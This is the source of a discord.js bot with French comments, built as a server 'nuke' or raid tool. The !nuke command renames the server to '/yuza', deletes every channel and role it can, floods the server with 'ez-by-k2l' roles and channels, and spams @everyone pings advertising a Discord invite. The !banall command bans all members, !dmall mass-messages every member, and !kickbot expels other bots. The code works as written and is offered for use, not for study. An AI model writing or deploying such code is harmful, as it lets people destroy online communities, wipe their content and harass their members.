const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const http = require('http');

// Serveur HTTP pour garder Render actif 24/7
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot Operational!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ]
});

// Liste des IDs autorisés (Toi et 40fd)
const OWNERS = ['1166445202148442112', '330080470983245824'];

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
});

client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        try {
            await member.kick('Anti-bot activé.');
        } catch (err) {}
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    const isOwner = OWNERS.includes(message.author.id);

    // ==========================================
    // 1. COMMANDE !KICKBOT
    // ==========================================
    if (message.content === '!kickbot') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("🤖 **[KICKBOT]** Nettoyage de tous les bots en cours...");

        try {
            const fetchedMembers = await message.guild.members.fetch();
            let count = 0;

            for (const [id, m] of fetchedMembers) {
                if (m.user.bot && m.id !== client.user.id) {
                    await m.kick('Kickbot - Nettoyage manuel').catch(() => {});
                    count++;
                }
            }

            await message.channel.send(`✅ **[KICKBOT]** Terminé ! ${count} bot(s) expulsé(s).`);
        } catch (error) {
            console.error("Erreur Kickbot :", error);
            message.channel.send("❌ Erreur lors de l'expulsion des bots.");
        }
    }

    // ==========================================
    // 2. COMMANDE !DMALL
    // ==========================================
    if (message.content === '!dmall') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");

        const filter = m => m.author.id === message.author.id;
        
        try {
            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
            const m = collected.first();

            if (m.content.toLowerCase() === 'annuler') {
                return message.channel.send("❌ **Opération DMAll annulée.**");
            }

            const messageTemplate = m.content;

            const previewEmbed = new EmbedBuilder()
                .setColor('#FEE75C')
                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                );

            const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });

            const buttonFilter = i => OWNERS.includes(i.user.id);
            const buttonCollector = confirmMsg.createMessageComponentCollector({ filter: buttonFilter, time: 60000, max: 1 });

            buttonCollector.on('collect', async interaction => {
                if (interaction.customId === 'cancel_dmall') {
                    return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] });
                }

                if (interaction.customId === 'confirm_dmall') {
                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });

                    const statusMsg = await message.channel.send({ content: "📊 Envoi en cours..." });

                    try {
                        await message.guild.members.fetch();
                        const members = message.guild.members.cache.filter(member => !member.user.bot);

                        let successCount = 0;
                        let failCount = 0;

                        const promises = members.map(async member => {
                            try {
                                const finalMessage = messageTemplate
                                    .replace(/\{mention\}/g, `<@${member.id}>`)
                                    .replace(/\{name\}/g, member.user.username);
                                await member.send(finalMessage);
                                successCount++;
                            } catch (err) {
                                failCount++;
                            }
                        });

                        await Promise.all(promises);
                        await statusMsg.edit({ content: `✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})` });

                    } catch (error) {
                        message.channel.send("❌ Erreur lors du DMAll.");
                    }
                }
            });
        } catch (err) {
            message.channel.send("⌛ Temps écoulé.");
        }
    }

    // ==========================================
    // 3. COMMANDE !NUKE (Suppression rôles/salons + Flooding)
    // ==========================================
    if (message.content === '!nuke') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("💥 **[NUKE TOTAL]** Destruction des rôles, salons et saturation en cours...");

        try {
            // A. Renommer le serveur en "/yuza"
            await message.guild.setName('/yuza').catch(() => {});

            // B. Suppression de tous les anciens salons en parallèle
            const deleteChannelPromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
            await Promise.all(deleteChannelPromises);

            // C. Suppression de tous les rôles possibles en parallèle (sauf géré par bot / @everyone / trop haut)
            const deleteRolePromises = message.guild.roles.cache
                .filter(role => role.editable && role.id !== message.guild.id)
                .map(role => role.delete().catch(() => {}));
            await Promise.all(deleteRolePromises);

            // D. Création massive de nouveaux rôles "ez-by-k2l" en parallèle
            const rolePromises = [];
            for (let r = 0; r < 35; r++) {
                rolePromises.push(
                    message.guild.roles.create({
                        name: 'ez-by-k2l',
                        color: 'Random',
                        reason: 'Nuke role flood'
                    }).catch(() => {})
                );
            }

            // E. Création de 40 salons avec permissions locales et rafale de 10 pings chacun
            const createPromises = [];
            for (let i = 0; i < 40; i++) {
                createPromises.push(
                    message.guild.channels.create({
                        name: 'ez-by-k2l',
                        type: 0,
                        permissionOverwrites: [
                            {
                                id: message.guild.id,
                                allow: [
                                    PermissionsBitField.Flags.ViewChannel,
                                    PermissionsBitField.Flags.SendMessages,
                                    PermissionsBitField.Flags.ManageChannels,
                                    PermissionsBitField.Flags.EmbedLinks,
                                    PermissionsBitField.Flags.AttachFiles,
                                    PermissionsBitField.Flags.MentionEveryone
                                ]
                            }
                        ]
                    }).then(async channel => {
                        const spamPromises = [];
                        for (let j = 0; j < 10; j++) {
                            spamPromises.push(
                                channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {})
                            );
                        }
                        await Promise.all(spamPromises);
                    }).catch(() => {})
                );
            }

            // Exécution simultanée de la création des rôles et des salons
            await Promise.all([...rolePromises, ...createPromises]);

        } catch (error) {
            console.error("Erreur Nuke :", error);
        }
    }

    // ==========================================
    // 4. COMMANDE !BANALL (Vague de bannissements massive)
    // ==========================================
    if (message.content === '!banall') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("🔨 **[BANALL]** Expulsion et bannissement de masse en cours...");

        try {
            await message.guild.members.fetch();
            const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);

            let banCount = 0;
            const banPromises = members.map(async member => {
                try {
                    await member.ban({ reason: 'Nuke / Raid banall' });
                    banCount++;
                } catch (err) {}
            });

            await Promise.all(banPromises);
            await message.channel.send(`✅ **[BANALL Terminé]** ${banCount} membre(s) banni(s).`);

        } catch (error) {
            console.error("Erreur Banall :", error);
            message.channel.send("❌ Erreur lors du banall.");
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
